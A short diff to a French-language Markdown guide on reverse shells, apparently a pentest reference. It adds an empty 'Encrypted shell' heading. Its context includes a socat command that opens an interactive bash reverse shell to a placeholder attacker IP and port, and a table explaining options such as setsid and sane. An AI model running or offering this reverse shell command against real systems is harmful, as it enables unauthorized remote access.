@@ -80,3 +80,6 @@ user@raspberrypi: ~$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty
 | **setsid** | crée le processus dans une nouvelle session                                                                               |
 | **sane**   |  stabilise le terminal en essayant de le "normaliser".                                                                                                                          |
 
+
+## __Encrypted shell__
+
